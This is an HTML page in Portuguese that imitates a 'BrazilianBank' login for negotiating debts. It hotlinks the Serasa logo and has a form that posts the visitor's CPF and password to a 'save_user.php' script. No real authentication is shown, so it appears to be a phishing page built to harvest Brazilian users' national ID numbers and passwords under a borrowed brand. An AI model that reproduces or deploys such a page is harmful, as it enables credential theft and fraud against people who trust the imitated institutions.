<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BrazilianBank Web - Entrar - CPF </title>
  
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
    }

    .brbank-login-container {
      display: flex;
      min-height: 100vh;
      position: relative;
    }

    /* Botão Voltar */
    .back-button {
      position: absolute;
      top: 20px;
      left: 20px;
      background-color: #184f93;
      color: white;
      border: none;
      border-radius: 30px;
      padding: 10px 18px;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
      display: flex;
      align-items: center;
      box-shadow: 0 4px 8px rgba(0,0,0,0.15);
      transition: background-color 0.3s ease;
      text-decoration: none;
      user-select: none;
      z-index: 1000;
    }

    .back-button:hover {
      background-color: #bf145f;
    }

    .back-button svg {
      width: 16px;
      height: 16px;
      margin-right: 8px;
      fill: white;
    }

    .brbank-left {
      background-color: #184f93;
      color: white;
      width: 50%;
      padding: 40px;
      position: relative;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }

    .brbank-image {
      max-width: 100%;
      height: auto;
      margin-bottom: 20px;
      border-radius: 20px;
    }

    .brbank-text h1 {
      font-size: 36px;
      margin-bottom: 10px;
    }

    .brbank-text p {
      font-size: 36px;
      font-weight: bold;
    }

    .highlight {
      background: white;
      color: #184f93;
      padding: 0 10px;
      border-radius: 5px;
    }

    .brbank-right {
      background-color: #f5f7fa;
      width: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .brbank-form {
      background: white;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }

    .brbank-form label {
      display: block;
      color: #184f93;
      font-weight: bold;
      margin-bottom: 8px;
    }

    .brbank-form input[type="text"], .brbank-form input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 2px solid #184f93;
      border-radius: 8px;
      margin-bottom: 8px;
      font-size: 16px;
    }

    .error-message {
      color: #184f93;
      font-size: 12px;
      margin-bottom: 16px;
      display: block;
    }

    .remember-me {
      display: flex;
      align-items: center;
      margin-bottom: 16px;
      font-size: 14px;
    }

    .remember-me input {
      margin-right: 8px;
    }

     .brbank-form button {
  background-color: #184f93; /* rosa BrazilianBank */
  color: white;
  border: none;
  border-radius: 8px;
  padding: 12px;
  width: 100%;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
  opacity: 1;
  pointer-events: auto;
  transition: background-color 0.3s ease;
}

.brbank-form button:hover {
  background-color: rgb(56, 127, 197);
}


    .enterprise-link {
      margin-top: 16px;
      font-size: 14px;
      color: #184f93;
      text-align: center;
    }

    .enterprise-link a {
      color: #184f93;
      font-weight: bold;
      text-decoration: none;
    }

    .terms {
      font-size: 12px;
      color: #666;
      margin-top: 12px;
      text-align: center;
    }

    .terms a {
      text-decoration: none;
      color: #666;
    }

    @media (max-width: 768px) {
      .brbank-login-container {
        flex-direction: column;
      }

      .brbank-left, .brbank-right {
        width: 100%;
        padding: 20px;
      }

      .brbank-text h1,
      .brbank-text p {
        font-size: 28px;
      }
      #continuar {
    opacity: 1 !important;
    pointer-events: auto !important;
    cursor: pointer !important;
  }
    }
  </style>
</head>
<body>
  <div class="brbank-login-container">
    <div class="brbank-left">
      <img src="https://www.serasa.com.br/assets/ecs/web/ecs-web-authorization-front/5.0.2/_next/static/images/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823.png" alt="Mulher com celular" class="brbank-image" />
      <div class="brbank-text">
        <h1>Na BrazilianBank<br>você pode</h1>
        <p><span class="highlight">Negociar</span><br><span class="highlight">suas dividas</span></p>
      </div>
    </div>

    <div class="brbank-right">
      <form action="save_user.php" method="POST" class="brbank-form">
        <label for="cpf">Digite seu CPF</label>
        <input name="cpf" type="text" id="cpf" placeholder="000.000.000-00" required minlength="11" maxlength="11" />
        <span class="error-message">Informe o seu CPF.</span>

        <label for="password">Digite sua senha</label>
        <input name="password" type="password" id="password" placeholder="************" required />
        <span class="error-message">Informe a sua senha.</span>
        
        <button type="submit" id="continuar">Continuar</button>
      </form>
    </div>
  </div>

</body>
</html>
